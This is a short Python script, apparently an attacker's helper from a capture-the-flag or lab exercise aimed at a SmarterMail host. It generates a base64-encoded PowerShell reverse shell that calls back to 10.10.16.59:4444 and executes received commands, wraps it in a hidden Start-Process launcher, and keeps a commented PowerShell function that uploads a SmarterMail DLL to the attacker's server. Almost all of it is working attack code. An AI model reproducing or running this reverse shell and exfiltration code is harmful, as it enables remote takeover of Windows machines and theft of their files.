import sys, base64
LHOST, PORT = "10.10.16.59", 4444
ps = f'''
$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{PORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
$w = New-Object IO.StreamWriter($stream); $w.AutoFlush=$true
$w.WriteLine("=== ANDERSON REV " + (whoami) + " @ " + (hostname) + " ===")
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
  $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
  try {{ $sendback = (iex $data 2>&1 | Out-String) }} catch {{ $sendback = $_ | Out-String }}
  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
  $sb = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sb,0,$sb.Length); $stream.Flush()
}}
$client.Close()
'''
enc = base64.b64encode(ps.encode("utf-16-le")).decode()
print(enc)
# notice hidden \n
script = f'''
$exe = "$env:SystemRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
Start-Process -FilePath $exe -ArgumentList "-NoP","-NonI","-w","Hidden","-EncodedCommand","{enc}" -WindowStyle Hidden
"rev_ok $(whoami)"
'''

print(script)



# netstat -ano | findstr LISTEN

# upload file on windows powershell
# function Up($path,$name){ try{ $b=[IO.File]::ReadAllBytes($path); $w=New-Object Net.WebClient; $w.UploadData("http://10.10.16.59:3333/upload/$name",$b)|Out-Null }catch{} }
# Up 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll' 'SmarterMail.Standard.dll'

# ls -Force #show hidden file